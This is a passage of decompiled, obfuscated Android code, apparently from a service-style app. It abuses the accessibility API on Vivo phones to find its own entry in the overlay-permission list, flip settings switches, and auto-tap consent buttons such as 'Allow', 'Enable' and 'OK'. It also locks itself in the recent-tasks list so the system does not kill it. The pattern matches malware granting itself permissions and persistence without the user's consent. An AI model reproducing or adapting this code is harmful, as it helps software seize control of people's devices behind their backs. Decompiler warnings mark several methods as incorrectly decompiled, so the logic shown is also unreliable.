        accessibilityNodeInfo = accessibilityNodeInfo2;
        str = str3;
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        accessibilityNodeInfo.performAction(2097152, bundle);
        accessibilityNodeInfo.recycle();
        rootInActiveWindow.recycle();
        vivoSteps$searchAppInOverlayList$1.f54960a0 = null;
        vivoSteps$searchAppInOverlayList$1.f54961a1 = null;
        vivoSteps$searchAppInOverlayList$1.f54962a2 = null;
        vivoSteps$searchAppInOverlayList$1.f54965a5 = 2;
    }

    /* JADX WARN: Removed duplicated region for block: B:107:0x0199  */
    /* JADX WARN: Removed duplicated region for block: B:108:0x019c  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0144  */
    /* renamed from: g0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Boolean m212432g0(String str, boolean z) throws IllegalAccessException, InterruptedException, IllegalArgumentException, InvocationTargetException {
        String str2;
        String string;
        Object next;
        AccessibilityNodeInfo accessibilityNodeInfo;
        int i;
        String str3;
        String str4;
        String string2;
        AccessibilityNodeInfo accessibilityNodeInfoM212412d9 = m212412d9(str);
        String str5 = this.f55141a2;
        if (accessibilityNodeInfoM212412d9 == null) {
            tz0.m214807a7("[toggleSwitch] ❌ u() 未找到文本: ", str, str5);
            return Boolean.FALSE;
        }
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212412d9);
        AccessibilityNodeInfo accessibilityNodeInfoM212382d7 = m212382d7(accessibilityNodeInfoM212412d9);
        if (accessibilityNodeInfoM212382d7 == null) {
            AccessibilityNodeInfo parent = accessibilityNodeInfoM212412d9.getParent();
            while (true) {
                if (parent == null) {
                    accessibilityNodeInfoM212382d7 = null;
                    break;
                }
                accessibilityNodeInfoM212382d7 = m212382d7(parent);
                if (accessibilityNodeInfoM212382d7 != null) {
                    break;
                }
                parent = parent.getParent();
            }
        }
        String str6 = "";
        dqtvuisjd dqtvuisjdVar = this.f55139a0;
        if (accessibilityNodeInfoM212382d7 == null) {
            t60.m214726f4(str5, "[toggleSwitch] n()未找到开关，尝试全局查找同一行开关...");
            AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                str2 = "";
                accessibilityNodeInfoM212382d7 = null;
            } else {
                int iCenterY = rectM24a5.centerY();
                int iCenterX = rectM24a5.centerX();
                ArrayList arrayList = new ArrayList();
                m212381d6(iCenterY, iCenterX, rootInActiveWindow, arrayList);
                int size = arrayList.size();
                int i2 = Integer.MAX_VALUE;
                int i3 = 0;
                AccessibilityNodeInfo accessibilityNodeInfo2 = null;
                while (i3 < size) {
                    Object obj = arrayList.get(i3);
                    i3++;
                    AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj;
                    Rect rectM24a52 = AbstractC0003a2.m24a5(accessibilityNodeInfo3);
                    int iCenterY2 = rectM24a52.centerY();
                    int iCenterX2 = rectM24a52.centerX();
                    int iAbs = Math.abs(iCenterY2 - iCenterY);
                    CharSequence className = accessibilityNodeInfo3.getClassName();
                    if (className == null || (string2 = className.toString()) == null) {
                        i = size;
                        str3 = str6;
                        str4 = str3;
                    } else {
                        i = size;
                        str3 = string2;
                        str4 = str6;
                    }
                    boolean z2 = AbstractC0779a1.m213652a5(str3, "RelativeLayout", true) || AbstractC0779a1.m213652a5(str3, "LinearLayout", true) || AbstractC0779a1.m213652a5(str3, "FrameLayout", true) || AbstractC0779a1.m213652a5(str3, "ConstraintLayout", true);
                    if (iAbs <= 80 && iCenterX2 > iCenterX && !z2) {
                        int i4 = iAbs + (accessibilityNodeInfo3.isCheckable() ? 0 : accessibilityNodeInfo3.isClickable() ? 100 : 500);
                        if (i4 < i2) {
                            i2 = i4;
                            accessibilityNodeInfo2 = accessibilityNodeInfo3;
                        }
                    }
                    size = i;
                    str6 = str4;
                }
                str2 = str6;
                if (accessibilityNodeInfo2 != null && !accessibilityNodeInfo2.isClickable() && !accessibilityNodeInfo2.isCheckable()) {
                    AccessibilityNodeInfo parent2 = accessibilityNodeInfo2.getParent();
                    for (int i5 = 0; parent2 != null && i5 < 5; i5++) {
                        if (parent2.isClickable() || parent2.isCheckable()) {
                            break;
                        }
                        parent2 = parent2.getParent();
                    }
                    parent2 = null;
                    if (parent2 != null) {
                        accessibilityNodeInfo2 = parent2;
                    }
                }
                if (accessibilityNodeInfo2 == null) {
                    t60.m214726f4(str5, "[findSwitchInSameRow] ❌ 未找到同行开关");
                }
                accessibilityNodeInfoM212382d7 = accessibilityNodeInfo2;
            }
        } else {
            str2 = "";
        }
        if (accessibilityNodeInfoM212382d7 == null) {
            String strM212384e2 = m212384e2("ro.vivo.os.build.display.id");
            if (Build.VERSION.SDK_INT > 28 || !AbstractC0779a1.m213652a5(strM212384e2, "Funtouch", true)) {
                tz0.m214807a7("[toggleSwitch] ❌ 未找到开关: ", str, str5);
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow2 = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow2 == null) {
                accessibilityNodeInfo = null;
                if (accessibilityNodeInfo != null) {
                    m212424f2((int) (dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels * 0.9f), (int) rectM24a5.exactCenterY());
                    int i6 = 500;
                    while (i6 > 0) {
                        int iMin = Math.min(i6, 100);
                        SystemClock.sleep(iMin);
                        i6 -= iMin;
                    }
                    return Boolean.TRUE;
                }
                accessibilityNodeInfoM212382d7 = accessibilityNodeInfo;
            } else {
                ArrayList arrayList2 = new ArrayList();
                m212378d3(rectM24a5, arrayList2, rootInActiveWindow2);
                if (!arrayList2.isEmpty()) {
                    Iterator it = arrayList2.iterator();
                    if (it.hasNext()) {
                        next = it.next();
                        if (it.hasNext()) {
                            int i7 = ((Rect) ((Pair) next).f57557a1).left;
                            do {
                                Object next2 = it.next();
                                int i8 = ((Rect) ((Pair) next2).f57557a1).left;
                                if (i7 > i8) {
                                    next = next2;
                                    i7 = i8;
                                }
                            } while (it.hasNext());
                        }
                    } else {
                        next = null;
                    }
                    Pair pair = (Pair) next;
                    if (pair != null) {
                        accessibilityNodeInfo = (AccessibilityNodeInfo) pair.f57556a0;
                    }
                    if (accessibilityNodeInfo != null) {
                    }
                }
            }
        }
        accessibilityNodeInfoM212382d7.getBoundsInScreen(new Rect());
        boolean zIsChecked = accessibilityNodeInfoM212382d7.isChecked();
        boolean zIsCheckable = accessibilityNodeInfoM212382d7.isCheckable();
        CharSequence className2 = accessibilityNodeInfoM212382d7.getClassName();
        if (className2 == null || (string = className2.toString()) == null) {
            string = str2;
        }
        if ((!z && !zIsChecked) || (z && zIsChecked)) {
            boolean z3 = Build.VERSION.SDK_INT <= 28 && AbstractC0779a1.m213652a5(m212384e2("ro.vivo.os.build.display.id"), "Funtouch", true);
            boolean zM213652a5 = AbstractC0779a1.m213652a5(string, "ImageView", true);
            if (!z3 || !zM213652a5 || zIsCheckable) {
                return Boolean.TRUE;
            }
            t60.m214726f4(str5, "[toggleSwitch] ⚠️ 方案1判断已是目标状态，但老版本Funtouch+ImageView不可靠，执行方案2强制点击");
        }
        Rect rectM24a53 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212382d7);
        m212424f2((int) rectM24a53.exactCenterX(), (int) rectM24a53.exactCenterY());
        int i9 = 500;
        while (i9 > 0) {
            int iMin2 = Math.min(i9, 100);
            SystemClock.sleep(iMin2);
            i9 -= iMin2;
        }
        List listM213306g5 = AbstractC0716jf.m213306g5("确定", "确认", "允许", "开启", "好的", "知道了", "是", "OK", "Confirm", "Allow", "Enable", "Got it", "Yes");
        AccessibilityNodeInfo rootInActiveWindow3 = dqtvuisjdVar.getRootInActiveWindow();
        if (rootInActiveWindow3 != null) {
            Iterator it2 = listM213306g5.iterator();
            while (it2.hasNext()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow3.findAccessibilityNodeInfosByText((String) it2.next());
                if (listFindAccessibilityNodeInfosByText != null && (!listFindAccessibilityNodeInfosByText.isEmpty())) {
                    Iterator<AccessibilityNodeInfo> it3 = listFindAccessibilityNodeInfosByText.iterator();
                    while (true) {
                        if (it3.hasNext()) {
                            AccessibilityNodeInfo next3 = it3.next();
                            if (next3.isVisibleToUser() && next3.isClickable()) {
                                Rect rectM24a54 = AbstractC0003a2.m24a5(next3);
                                m212424f2((int) rectM24a54.exactCenterX(), (int) rectM24a54.exactCenterY());
                                int i10 = 500;
                                while (i10 > 0) {
                                    int iMin3 = Math.min(i10, 100);
                                    SystemClock.sleep(iMin3);
                                    i10 -= iMin3;
                                }
                                next3.recycle();
                            } else {
                                next3.recycle();
                            }
                        }
                    }
                }
            }
            rootInActiveWindow3.recycle();
        }
        return Boolean.TRUE;
    }

    /* JADX WARN: Code restructure failed: missing block: B:148:0x0347, code lost:
    
        if (p000.b81.m210571b1(1000, r4) == r5) goto L149;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:101:0x01fa  */
    /* JADX WARN: Removed duplicated region for block: B:106:0x0222 A[Catch: Exception -> 0x0044, TRY_ENTER, TRY_LEAVE, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:116:0x0259  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x025b A[Catch: Exception -> 0x0044, PHI: r2 r4 r6
      0x025b: PHI (r2v25 java.lang.String) = (r2v23 java.lang.String), (r2v26 java.lang.String) binds: [B:115:0x0257, B:27:0x006a] A[DONT_GENERATE, DONT_INLINE]
      0x025b: PHI (r4v5 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) = 
      (r4v4 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1)
      (r4v2 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1)
     binds: [B:115:0x0257, B:27:0x006a] A[DONT_GENERATE, DONT_INLINE]
      0x025b: PHI (r6v24 com.storm.safe.rock.service.modules.yw5xud.a8) = (r6v22 com.storm.safe.rock.service.modules.yw5xud.a8), (r6v25 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:115:0x0257, B:27:0x006a] A[DONT_GENERATE, DONT_INLINE], TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:119:0x0272  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x0279 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:130:0x02e5 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:131:0x02ef A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:136:0x0309  */
    /* JADX WARN: Removed duplicated region for block: B:145:0x0324 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:151:0x034d A[Catch: Exception -> 0x0044, TRY_LEAVE, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:161:0x022a A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00f6 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:59:0x0104 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:65:0x0124 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01c2 A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x01ec A[Catch: Exception -> 0x0044, TryCatch #4 {Exception -> 0x0044, blocks: (B:13:0x003e, B:150:0x034a, B:123:0x0279, B:125:0x029a, B:128:0x02dd, B:130:0x02e5, B:131:0x02ef, B:134:0x02ff, B:141:0x0310, B:143:0x031a, B:145:0x0324, B:147:0x032e, B:151:0x034d, B:18:0x004d, B:21:0x0058, B:24:0x0061, B:27:0x006a, B:117:0x025b, B:30:0x0073, B:114:0x024b, B:63:0x011c, B:65:0x0124, B:67:0x012a, B:70:0x0132, B:72:0x013a, B:74:0x0142, B:76:0x014a, B:80:0x0155, B:81:0x016f, B:83:0x0175, B:85:0x0181, B:88:0x0188, B:89:0x018c, B:91:0x0192, B:93:0x019e, B:95:0x01bd, B:97:0x01c2, B:102:0x01fc, B:56:0x00f6, B:59:0x0104, B:106:0x0222, B:98:0x01ec, B:38:0x0091, B:54:0x00eb), top: B:167:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:99:0x01f3  */
    /* JADX WARN: Type inference failed for: r6v0, types: [int] */
    /* JADX WARN: Type inference failed for: r6v12, types: [com.storm.safe.rock.service.modules.yw5xud.a8] */
    /* JADX WARN: Type inference failed for: r6v13 */
    /* JADX WARN: Type inference failed for: r6v16, types: [com.storm.safe.rock.service.modules.yw5xud.a8] */
    /* JADX WARN: Type inference failed for: r6v17, types: [com.storm.safe.rock.service.modules.yw5xud.a8] */
    /* JADX WARN: Type inference failed for: r6v20 */
    /* JADX WARN: Type inference failed for: r6v3 */
    /* JADX WARN: Type inference failed for: r6v37 */
    /* JADX WARN: Type inference failed for: r6v38 */
    /* JADX WARN: Type inference failed for: r6v39 */
    /* JADX WARN: Type inference failed for: r6v40 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:130:0x02e5 -> B:150:0x034a). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:140:0x030f -> B:144:0x0322). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:143:0x031a -> B:144:0x0322). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:148:0x0347 -> B:144:0x0322). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:62:0x011b -> B:63:0x011c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:99:0x01f3 -> B:100:0x01f8). Please report as a decompilation issue!!! */
    /* renamed from: g1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212433g1(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1 vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1;
        String string;
        String str;
        C0371a8 c0371a8;
        int i;
        int i2;
        VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1 vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$12;
        C0371a8 c0371a82;
        C0371a8 c0371a83;
        String str2;
        int i3;
        int i4;
        int i5;
        int i6;
        C0371a8 c0371a84;
        AccessibilityNodeInfo rootInActiveWindow;
        String string2;
        String str3;
        int i7;
        int iOrdinal;
        int i8;
        String str4 = this.f55141a2;
        Context context = this.f55140a1;
        if (continuationImpl instanceof VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) {
            vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1 = (VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) continuationImpl;
            int i9 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7;
            if ((i9 & Integer.MIN_VALUE) != 0) {
                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = i9 - Integer.MIN_VALUE;
            } else {
                vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1 = new VivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1(this, continuationImpl);
            }
        }
        Object objM212427f5 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54971a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        C0371a8 c0371a85 = vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7;
        int i10 = 2;
        boolean z = false;
        int i11 = 1;
        try {
            switch (c0371a85) {
                case 0:
                    kg1.m213544f4(objM212427f5);
                    try {
                        string = context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), 0)).toString();
                    } catch (Exception unused) {
                        string = context.getString(R$string.app_name);
                        t60.m214694b5(string, "{\n            context.ge…e) // 从资源获取默认名称\n        }");
                    }
                    try {
                        t60.m214704c5(str4, "[锁定流程] 1. 返回APP前台");
                        Intent intentM211757a1 = new C0328b3(context).m211757a1();
                        if (intentM211757a1 != null) {
                            context.startActivity(intentM211757a1);
                        } else {
                            t60.m214726f4(str4, "[锁定流程] ⚠️ 无可用的启动 Activity，跳过返回前台");
                        }
                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = this;
                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = string;
                        vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = 1;
                        if (b81.m210571b1(300L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) != coroutineSingletons) {
                            str = string;
                            c0371a8 = this;
                            t60.m214704c5(c0371a8.f55141a2, "[锁定流程] 2. 打开最近任务列表");
                            i = 0;
                            i2 = 1;
                            c0371a85 = c0371a8;
                            if (i2 < 4) {
                                c0371a85.f55139a0.performGlobalAction(3);
                                int i12 = i;
                                i3 = i2;
                                i5 = i12;
                                str2 = str;
                                i4 = i11;
                                C0371a8 c0371a86 = c0371a85;
                                if (i4 >= 11) {
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54966a0 = c0371a86;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54967a1 = str2;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54968a2 = i5;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54969a3 = i3;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54970a4 = i4;
                                    vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1.f54973a7 = i10;
                                    String str5 = str2;
                                    if (b81.m210571b1(100L, vivoSteps$tryLockVivoAppInRecents_HuaweiStyle$1) != coroutineSingletons) {
                                        str2 = str5;
                                        c0371a84 = c0371a86;
                                        rootInActiveWindow = c0371a84.f55139a0.getRootInActiveWindow();
                                        if (rootInActiveWindow != null) {
                                            CharSequence packageName = rootInActiveWindow.getPackageName();
                                            if (packageName == null || (string2 = packageName.toString()) == null) {
                                                string2 = "";
                                            }
                                            if (AbstractC0779a1.m213652a5(string2, "launcher", z) || AbstractC0779a1.m213652a5(string2, "recents", z) || string2.equals("com.bbk.launcher2") || AbstractC0779a1.m213652a5(string2, "upslide", z)) {
                                                i5 = 1;
                                            }
                                            if (i5 == 0) {
                                                Iterator it = AbstractC0716jf.m213306g5("清除", "清理", "全部清除", "清理全部", "锁定", "分屏", "小窗").iterator();
                                                while (true) {
                                                    if (it.hasNext()) {
                                                        String str6 = (String) it.next();
                                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str6);
                                                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                                            while (it2.hasNext()) {
                                                                if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                                                    t60.m214704c5(c0371a84.f55141a2, "[锁定流程] ✅ 通过关键词'" + str6 + "'确认最近任务已打开");
                                                                    i5 = 1;
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                            rootInActiveWindow.recycle();
                                        }
                                        if (i5 == 0) {
                                            t60.m214704c5(c0371a84.f55141a2, "[锁定流程] ✅ 最近任务列表已打开 (第" + i3 + "次尝试，耗时" + (i4 * 100) + "ms)");
                                            int i13 = i3;
                                            i = i5;
                                            i6 = i13;
                                            str = str2;
                                            c0371a85 = c0371a84;
                                            if (i == 0) {
                                                if (i6 < 3) {
